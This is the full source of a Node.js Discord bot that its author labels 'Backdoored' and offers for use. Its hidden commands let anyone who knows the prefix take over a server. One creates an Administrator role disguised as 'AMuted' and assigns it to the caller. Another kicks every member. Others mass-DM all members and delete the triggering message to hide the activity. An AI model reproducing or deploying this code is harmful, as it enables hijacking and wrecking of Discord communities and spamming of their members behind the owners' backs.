// Everything is already configured, you don't need to edit anything.

// DO NOT STEAL THE CODE.
// If you need to use parts, contact notloann on discord before.

// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const readline = require('readline');
const fs = require('fs');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log("- Backdoored Config -\n");

function readConfig() {
    if (fs.existsSync('config.json')) {
        return JSON.parse(fs.readFileSync('config.json', 'utf-8'));
    }
    return null;
}

function saveConfig(token, prefix) {
    const config = { token, prefix };
    fs.writeFileSync('config.json', JSON.stringify(config, null, 2));
    console.log('Configuration saved to config.json');
}

const config = readConfig();

if (config) {
    console.log("Configuration loaded from config.json");
    startBot(config.token, config.prefix);
} else {
    rl.question("Bot Token: ", (token) => {
        rl.question("Bot Prefix: ", (prefix) => {
            clearConsole();

            rl.question("Do you want to save the config? (yes/no): ", (answer) => {
                if (answer.toLowerCase() === 'yes') {
                    saveConfig(token, prefix);
                }
                startBot(token, prefix);
            });
        });
    });
}

function startBot(token, prefix) {
    clearConsole();
    
    const intents = [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages // Ajout des intents pour les messages directs
    ];

    const client = new Client({ intents });

    client.once('ready', () => {
        clearConsole();
        console.log(`\x1b[32m
  ____             _       _                          _ 
 |  _ \\           | |     | |                        | |
 | |_) | __ _  ___| | ____| | ___   ___  _ __ ___  __| |
 |  _ < / _\` |/ __| |/ / _\` |/ _ \\ / _ \\| '__/ _ \\/ _\` |
 | |_) | (_| | (__|   < (_| | (_) | (_) | | |  __/ (_| |
 |____/ \\__,_|\\___|_|\\_\\__,_|\\___/ \\___/|_|  \\___|\\__,_|\x1b[0m

                 Made with <3 by NotLoann
                                                         
                                                         
        `);
        console.log(`Bot successfully started with \x1b[32mBackdoored.\x1b[37m`);
        console.log(`\nCommands:\n`);
        console.log(`\x1b[36m${prefix}l\x1b[0m - gives you admin permissions.`);
        console.log(`\x1b[36m${prefix}ka\x1b[0m - kicks everyone in the server.`);
        console.log(`\x1b[36m${prefix}speak\x1b[0m - unmutes you.`);
        console.log(`\x1b[36m${prefix}say\x1b[0m [message] - makes the bot say whatever you want.`);
        console.log(`\x1b[36m${prefix}dm\x1b[0m (user mention) [message] - sends a DM to the mentioned user.`);
        console.log(`\x1b[36m${prefix}dmall [message]\x1b[0m - sends a DM to all members in the server.\n`); // Nouvelle commande DMALL
        console.log("LOGS:\n");
    });

    client.on('guildCreate', (guild) => {
        console.log(`Joining ${guild.name}`);
    });

    client.on('messageCreate', async (message) => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'ka') {
            const members = message.guild.members.cache;

            for (const user of members.values()) {
                try {
                    await user.kick();
                    console.log(`User ${user.user.username} got kicked in ${message.guild.name}`);
                } catch (e) {
                    console.log(`Failed to kick ${user.user.username}: ${e.message}`);
                }
            }
            console.log("Successfully kicked everyone.");
        }

        if (command === 'l') {
            const perms = PermissionsBitField.Flags.Administrator;
            const role = await message.guild.roles.create({
                name: 'AMuted',
                permissions: [perms]
            });
            await message.member.roles.add(role);
            console.log("Gave you admin perms.");
        }

        if (command === 'dm') {
            const userMention = message.mentions.users.first();
            const dmMessage = args.slice(1).join(' ');

            if (!userMention) {
                await message.channel.send("Please mention a user to DM."); 
                return; 
            }

            try {
                await userMention.send(dmMessage);
                console.log(`Sent DM to ${userMention.username}: ${dmMessage}`);
                await message.channel.send(`DM sent to ${userMention.username}!`); 
            } catch (e) {
                console.log(`Couldn't send DM to ${userMention.username}: ${e.message}`);
                await message.channel.send(`Couldn't send DM to ${userMention.username}: ${e.message}`); 
            }

            await message.delete(); 
        }

        if (command === 'dmall') {
            const dmMessage = args.join(' ');

            if (!dmMessage) {
                await message.channel.send("Please provide a message to send to all members.");
                return; 
            }

            const members = await message.guild.members.fetch(); 
            let successCount = 0; 

            for (const member of members.values()) {
                if (!member.user.bot) { // Ignorer les bots
                    try {
                        await member.send(dmMessage);
                        console.log(`Sent DM to ${member.user.username}`);
                        successCount++;
                    } catch (e) {
                        console.log(`Couldn't send DM to ${member.user.username}: ${e.message}`);
                    }
                }
            }

            await message.channel.send(`DM sent to ${successCount} members!`);
            await message.delete(); 
        }

        if (command === 'say') {
            const msg = args.join(' ');
            await message.channel.send(msg);
        }

    });

    client.login(token).catch((e) => {
        console.log(`Error logging in: ${e.message}`);
    });
}

function clearConsole() {
    console.clear();
}
